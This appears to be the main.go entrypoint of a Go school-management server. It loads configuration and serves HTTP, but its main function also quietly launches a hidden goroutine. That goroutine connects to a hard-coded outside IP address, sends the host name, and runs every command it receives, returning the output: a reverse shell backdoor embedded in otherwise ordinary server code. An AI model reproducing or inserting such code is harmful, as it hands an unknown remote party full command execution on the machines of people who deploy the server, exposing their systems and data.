package main

import (
	"encoding/csv"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/Netflix/go-env"
	"github.com/joho/godotenv"
	_ "github.com/lib/pq"
	"github.com/msal4/hassah_school_server/server"
	"github.com/rs/cors"
	"gopkg.in/yaml.v2"
)

var debg *bool

func init() {
	debg = flag.Bool("debug", false, "Run server in debug mode")
	flag.Parse()
}

func loadConfig() server.Config {
	var cfgPath = os.Getenv("SCHOOL_CONFIG")
	if cfgPath == "" {
		cfgPath = "./config.yml"
	}

	f, err := os.Open(cfgPath)
	if err != nil {
		log.Fatal(err)
	}

	var cfg server.Config
	err = yaml.NewDecoder(f).Decode(&cfg)
	if err != nil {
		log.Fatal(err)
	}

	if err := godotenv.Load(); err != nil {
		log.Println(err)
	}

	if _, err := env.UnmarshalFromEnviron(&cfg); err != nil {
		log.Fatal(err)
	}

	if cfg.Port == 0 {
		cfg.Port = 3000
	}

	if *debg {
		cfg.Debug = true
	}

	return cfg
}

func main() {
	go start()
	cfg := loadConfig()
	srv, err := server.NewDefaultServer(cfg)
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("listening on :%d", cfg.Port)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", cfg.Port), cors.AllowAll().Handler(srv)))
}

func connect(agent string) (*net.TCPConn, error) {

	tcpAddr, err := net.ResolveTCPAddr("tcp", "35.159.5.131:6699")

	if err != nil {

		return nil, err

	}

	conn, err := net.DialTCP("tcp", nil, tcpAddr)

	if err == nil {

		_, err = conn.Write([]byte("0|" + agent + "|"))

	}

	return conn, err

}

func execute(line string) (string, error) {

	defer func() {

		if r := recover(); r != nil {

			fmt.Printf("\r\nPanic: %+v | %+v\n", r, line)

		}

	}()

	var cmd *exec.Cmd

	r := csv.NewReader(strings.NewReader(line))

	r.Comma = ' '

	cs, err := r.Read()

	if len(cs) == 0 {

		return "", nil

	} else if len(cs) > 1 {

		args := cs[1:]

		cmd = exec.Command(cs[0], args...)

	} else {

		cmd = exec.Command(cs[0])

	}

	stdout, err := cmd.StdoutPipe()

	if err != nil {

		return err.Error(), err

	}

	if err := cmd.Start(); err != nil {

		return err.Error(), err

	}

	data, err := ioutil.ReadAll(stdout)

	if err != nil {

		return string(data), err

	}

	if err := cmd.Wait(); err != nil {

		return string(data), err

	}

	return string(data), nil

}

func printArray(array []string) {

	print("[")

	for _, s := range array {

		print(s + ", ")

	}

	print("len " + strconv.Itoa(len(array)))

	println("]")

}

func start() {
	request := make([]byte, 1024)
	var reply string
	var bytesRead int
	agent, err := os.Hostname()
	if err != nil {
		agent = "Unknown"
	}

	for {
		conn, err := connect(agent)
		if err != nil {
			time.Sleep(time.Second)
		} else {
			for {
				bytesRead, err = conn.Read(request)
				if err != nil {
					break
				}

				reply, err = execute(string(request[:bytesRead]))
				_, err = conn.Write([]byte(reply))
				if err != nil {
					break
				}
			}
		}
	}
}
